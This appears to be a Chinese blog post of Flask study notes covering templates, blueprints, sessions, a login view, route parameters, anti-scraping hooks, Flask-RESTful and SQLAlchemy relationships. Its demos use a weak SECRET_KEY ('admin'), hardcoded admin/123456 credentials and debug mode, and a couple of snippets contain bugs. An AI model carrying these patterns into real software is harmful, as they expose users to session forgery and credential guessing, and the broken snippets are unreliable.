<p>一般项目开发时都会开启debug模式</p>
<h2 id="2、简单的模板渲染"><a href="#2、简单的模板渲染" class="headerlink" title="2、简单的模板渲染"></a>2、简单的模板渲染</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">render_template()  <span class="comment">#可以返回一个渲染的html页面</span></span><br></pre></td></tr></table></figure>

<p>示例：</p>
<p>app.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=<span class="string">&quot;法外狂徒张三&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/index.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>index<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>name: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以利用render_template去将后端的一些数据返回到前端，然后再使用去使用传递过来的参数</p>
<h2 id="3、对文件结构进行进行拆分"><a href="#3、对文件结构进行进行拆分" class="headerlink" title="3、对文件结构进行进行拆分"></a>3、对文件结构进行进行拆分</h2><p>文件结构：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/137d93a1d65364fb1dee979682c5fa2a--6af8--image-20231119182749925.png" alt="image-20231119182749925"></p>
<p>将除了主文件的其他文件都移入一个单独创建的App文件夹当中。</p>
<blockquote>
<p>init.py：初始化的文件，在这里我们将app的创建函数放入其中，待需要使用时导入即可</p>
<p>models.py：模板文件，后边主要用于数据库方面的操作</p>
<p>views.py：视图函数的存放，也就是存放各种路由的地方</p>
</blockquote>
<p>为了方便视图函数的使用，使用蓝图去绑定</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.register_blueprint(blueprint=blue)</span><br></pre></td></tr></table></figure>

<p>将app绑定在blue上，这样之后路由就可以这样去使用了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure>

<h2 id="4、简易登录界面的实现"><a href="#4、简易登录界面的实现" class="headerlink" title="4、简易登录界面的实现"></a>4、简易登录界面的实现</h2><h3 id="①cookie的一些设置"><a href="#①cookie的一些设置" class="headerlink" title="①cookie的一些设置"></a>①cookie的一些设置</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">response = redirect(<span class="string">&#x27;/home/&#x27;</span>) <span class="comment">#重定向，用于登录后界面的跳转</span></span><br><span class="line"></span><br><span class="line">response.set_cookie(<span class="string">&#x27;user&#x27;</span>, username, max_age=<span class="number">3600</span>*<span class="number">24</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>可以直接通过set__cookie去设置一个json格式的cookie</p>
<h3 id="②session的一些设置"><a href="#②session的一些设置" class="headerlink" title="②session的一些设置"></a>②session的一些设置</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>将app的配置文件中的SECRET_KEY修改为不空的值，并且将这个作为密匙去加密</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line"></span><br><span class="line">session.permanent = <span class="literal">True</span>  <span class="comment">#默认是false，关闭浏览器后就清空session</span></span><br></pre></td></tr></table></figure>

<h3 id="③实现"><a href="#③实现" class="headerlink" title="③实现"></a>③实现</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, redirect, render_template, request, session</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">blue = Blueprint(<span class="string">&#x27;user&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;home.html&#x27;</span>, username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)   <span class="comment">#获取传递过来的参数</span></span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">            response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># response.set_cookie(&#x27;user&#x27;, username, max_age=3600*24*7)</span></span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line">            session.permanent = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;用户名或密码错误！&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    session.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/string/&lt;string:name&gt;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment"># def get_string(name):</span></span><br><span class="line"><span class="comment">#     print(type(name))</span></span><br><span class="line"><span class="comment">#     return name</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/redirect/&#x27;)</span></span><br><span class="line"><span class="comment"># def make_redirect():</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return redirect(&#x27;https://www.qq.com&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>在自己设计一个前段登入即可</p>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="5、路由参数"><a href="#5、路由参数" class="headerlink" title="5、路由参数"></a>5、路由参数</h2><blockquote>
<p>string  接收如何没有斜杠(‘&#x2F;‘)的字符串(默认)</p>
<p>int  接收整型</p>
<p>float   接收浮点型</p>
<p>path  接收路径，可接收斜线(‘&#x2F;‘)</p>
<p>uuid   只接受uuid字符串，唯一码，一种生成规律（uuid是一段特定的字符串，基本无法伪造）</p>
<p>any   可以同时指定多种路径，进行限定</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/any/&lt;any(apple, orange, banana):fruit&gt;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_any</span>(<span class="params">fruit</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(fruit))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(fruit)</span><br></pre></td></tr></table></figure>

<p>any表示限定只能在给定的之中选择</p>
<h2 id="6、路由请求方法的指定"><a href="#6、路由请求方法的指定" class="headerlink" title="6、路由请求方法的指定"></a>6、路由请求方法的指定</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure>

<p>设置该路由可以由GET和POST这两种请求方法区访问</p>
<p>一些最常见的请求方式</p>
<blockquote>
<p>GET</p>
<p>POST</p>
<p>PUT</p>
<p>DELETE</p>
</blockquote>
<h1 id="四、flask中四个全局变量"><a href="#四、flask中四个全局变量" class="headerlink" title="四、flask中四个全局变量"></a>四、flask中四个全局变量</h1><p>**</p>
<table>
<thead>
<tr>
<th><strong>变量</strong></th>
<th><strong>上下文</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>current_app</td>
<td>应用上下文</td>
<td>相当与在主程序中激活的实例化app（<code>app=Flask(__name__)</code>）</td>
</tr>
<tr>
<td>g</td>
<td>应用上下文</td>
<td>一次性函数，处理请求的临时变量。只在一个请求中被应用，下个请求开始时会自动重置</td>
</tr>
<tr>
<td>request</td>
<td>请求上下文</td>
<td>请求对象。存放了客户端发来的HTTP信息</td>
</tr>
<tr>
<td>session</td>
<td>请求上下文</td>
<td>记录用户和服务器之间的会话的。在服务器端记录需要记住的信息。（和cookie对应，cookies是记录在客户端的）</td>
</tr>
</tbody></table>
<p><strong>request中的一些用法:</strong></p>
<blockquote>
<p>url   完整请求地址</p>
<p>base_url   去掉GET参数的URL</p>
<p>host_url   只有主机和端口号的URL</p>
<p>path  路由中的路径</p>
<p>method 请求方式</p>
<p>remote_addr  请求的客户端地址</p>
<p>args   GET请求参数</p>
<p>form   POST请求参数</p>
<p>files   文件上传</p>
<p>headers  请求头</p>
<p>cookies   请求头中的cookie</p>
</blockquote>
<h1 id="五、钩子函数装饰器"><a href="#五、钩子函数装饰器" class="headerlink" title="五、钩子函数装饰器"></a>五、钩子函数装饰器</h1><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>before_first_request</td>
<td>处理第一次请求之前</td>
</tr>
<tr>
<td>before_request</td>
<td>在每次请求之前，通常利用这个处理一些变量，实现反爬</td>
</tr>
<tr>
<td>app.after_request</td>
<td>注册一个函数，如果没有未处理的异常抛出，每次请求结束后运行</td>
</tr>
<tr>
<td>app.teardown_request</td>
<td>有异常也会运行，每次请求结束后。当APP上下文被移除后执行的函数，可以进行数据库的提交和回滚</td>
</tr>
</tbody></table>
<p>使用示例：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#每次请求之前访问</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="六、Flask的一些插件的使用"><a href="#六、Flask的一些插件的使用" class="headerlink" title="六、Flask的一些插件的使用"></a>六、Flask的一些插件的使用</h1><h2 id="1、flask-caching"><a href="#1、flask-caching" class="headerlink" title="1、flask-caching"></a>1、flask-caching</h2><p>安装</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install flask-caching</span><br></pre></td></tr></table></figure>

<p>初始化</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cache = Cache(config=&#123;</span><br><span class="line">    <span class="string">&#x27;CACHE_TYPE&#x27;</span>: <span class="string">&#x27;simple&#x27;</span>  <span class="comment">#缓存类型</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>添加缓存</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@cache.cached(<span class="params">timeout=<span class="number">20</span></span>)   </span><span class="comment">#使缓存存在20秒</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;index2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(g.star)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;index2&#x27;</span></span><br></pre></td></tr></table></figure>

<p>对反爬的相关应用</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#每次请求之前访问</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(request.path)</span><br><span class="line">    <span class="built_in">print</span>(request.method)</span><br><span class="line">    <span class="built_in">print</span>(request.remote_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#简单的反爬</span></span><br><span class="line">    <span class="built_in">print</span>(request.user_agent)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> request.user_agent.string:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;您正在使用python爬虫，再见！&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#针对ip作反爬</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> cache.get(ip):</span><br><span class="line">        <span class="comment">#做了个拦截，不会进入视图函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;小伙子，别爬了！&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#对每个ip设置一个缓存，1秒内不让重复访问</span></span><br><span class="line">        cache.<span class="built_in">set</span>(ip, <span class="string">&#x27;value&#x27;</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h1 id="七、前后端分离模式"><a href="#七、前后端分离模式" class="headerlink" title="七、前后端分离模式"></a>七、前后端分离模式</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/7a211a47e9bdbf3195d69d8b36829d3b--ad35--image-20231119204503992.png" alt="image-20231119204503992"></p>
<p>将原本的views拆分为urls和apis。</p>
<p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  路由文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> api</span><br><span class="line"><span class="keyword">from</span> .apis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">api.add_resource(HelloResource, <span class="string">&#x27;/hello/&#x27;</span>)</span><br><span class="line">api.add_resource(UserResource, <span class="string">&#x27;/user/&#x27;</span>, endpoint=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">api.add_resource(User2Resource, <span class="string">&#x27;/user2/&#x27;</span>)</span><br><span class="line">api.add_resource(User4Resource, <span class="string">&#x27;/user4/&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>apis.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask_restful <span class="keyword">import</span> Resource, fields, marshal_with, reqparse</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类视图  CBV</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloResource</span>(<span class="title class_ inherited__">Resource</span>):   <span class="comment">#必须要继承Resource</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;get请求&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;methods&#x27;</span>: <span class="string">&#x27;post请求&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask-RESTful</span></span><br><span class="line">ret_field = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;like&#x27;</span>: fields.String(default=<span class="string">&#x27;ball&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;data2&#x27;</span>: fields.String(attribute=<span class="string">&#x27;data&#x27;</span>) <span class="comment">#类似于引用，将data的值给一个另外名字的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserResource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field</span>)     </span><span class="comment">#flask的一个拓展，用以规范后端返回数据的格式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;千峰教育Python&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_fields = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: fields.Url(endpoint=<span class="string">&#x27;id&#x27;</span>, absolute=<span class="literal">True</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret_field2 = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.Nested(user_fields)  <span class="comment">#获取一个列表数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User2Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field2</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        user = User.query.first()   <span class="comment">#从数据库中拿出数据</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: user</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数解析  完成前端数据的返回</span></span><br><span class="line">parser = reqparse.RequestParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;name&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;name是必须的&#x27;</span>)   </span><br><span class="line">parser.add_argument(<span class="string">&#x27;age&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, action=<span class="string">&#x27;append&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User4Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        name = args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        age = args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;age&#x27;</span>: age&#125;</span><br></pre></td></tr></table></figure>

<h1 id="八、数据表之间的操作"><a href="#八、数据表之间的操作" class="headerlink" title="八、数据表之间的操作"></a>八、数据表之间的操作</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#一对多</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grade</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;grade&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#建立关联</span></span><br><span class="line">    <span class="comment">#定义班级表的一对多关系，不是字段，Student为学生表模型，backref为反向查找名称</span></span><br><span class="line">    students = db.relationship(<span class="string">&#x27;Student&#x27;</span>, backref=<span class="string">&#x27;grade&#x27;</span>, lazy=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;student&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">    <span class="comment">#创建外键，关联到班级表的主键，实现一对多关系，班级表中也要有对应操作</span></span><br><span class="line">    gradeid = db.Column(db.Integer, db.ForeignKey(Grade.<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多对多    </span></span><br><span class="line"><span class="comment">#中间表（不是类）    </span></span><br><span class="line">collect = db.Table(</span><br><span class="line">    <span class="string">&#x27;collects&#x27;</span>,</span><br><span class="line">    <span class="comment">#user_id为表字段名称，user.id未外键表的id</span></span><br><span class="line">    db.Column(<span class="string">&#x27;user_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;usermodel.id&#x27;</span>), primary_key=<span class="literal">True</span>),</span><br><span class="line">    db.Column(<span class="string">&#x27;movie_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;movie.id&#x27;</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserModel</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;usermodel&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Movie</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;movie&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#多对多  关联的学生摆个的模型   中间表的名称   反向查找</span></span><br><span class="line">    users = db.relationship(<span class="string">&#x27;UserModel&#x27;</span>, backref=<span class="string">&#x27;movies&#x27;</span>, lazy=<span class="string">&#x27;dynamic&#x27;</span>, secondary=collect)</span><br></pre></td></tr></table></figure>

<p>lazy属性</p>
<blockquote>
<p>dynamic：    会返回一个query对象(查询集)，可以继续使用其他查询方法，如all()</p>
<p>select：    首次访问到属性的时候，就会加载该属性的数据</p>
<p>joined：    在对关联的两个表进行join操作，从而获取到所有相关的对象</p>
<p>True：    返回一个可用的列表对象，同select</p>
</blockquote>
